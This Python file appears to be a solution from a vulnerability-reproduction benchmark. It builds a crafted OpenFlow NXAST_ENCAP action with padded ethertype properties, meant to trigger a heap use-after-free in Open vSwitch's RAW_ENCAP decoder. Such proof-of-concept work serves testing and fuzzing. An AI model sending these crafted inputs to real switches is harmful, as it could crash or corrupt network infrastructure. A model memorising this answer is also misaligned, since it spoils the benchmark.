import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in OVS RAW_ENCAP decoding.
        The vulnerability occurs when decode_ed_prop() triggers a reallocation of the ofpbuf (e.g., crossing a stub size),
        invalidating the 'encap' pointer held by decode_NXAST_RAW_ENCAP.
        
        The PoC constructs an NXAST_ENCAP action with enough properties to exceed the typical small buffer optimization (64 bytes)
        often used in OVS parsing paths or test harnesses.
        """
        
        # NXAST_ENCAP (RAW_ENCAP) Action Header (12 bytes)
        # Type: OFPAT_VENDOR (0xffff)
        # Length: 72 (0x0048)
        # Vendor: Nicira (0x002320)
        # Subtype: NXAST_ENCAP (0x002e)
        # Next Protocol: 0x0000
        header = struct.pack('!HHLHH', 0xffff, 72, 0x002320, 0x002e, 0)
        
        # Properties (60 bytes total)
        # We use NXENCAP_PROP_ETHERTYPE (Type 0) properties.
        # We need to fill the buffer to trigger reallocation.
        # Assume a 64-byte stub or similar threshold.
        # Action Header (12 bytes input, ~8 bytes output).
        # We need enough properties to push output size > 64 bytes.
        
        # 6 properties of 8 bytes:
        # Type(2), Len(2), Ethertype(2), Pad(2)
        prop_8 = struct.pack('!HHH2x', 0, 8, 0x0800)
        
        # 1 property of 12 bytes to fill the remaining space exactly to 72 bytes:
        # Type(2), Len(2), Ethertype(2), Pad(6)
        prop_12 = struct.pack('!HHH6x', 0, 12, 0x0800)
        
        # Payload construction: 6 * 8 + 1 * 12 = 48 + 12 = 60 bytes
        payload = (prop_8 * 6) + prop_12
        
        return header + payload
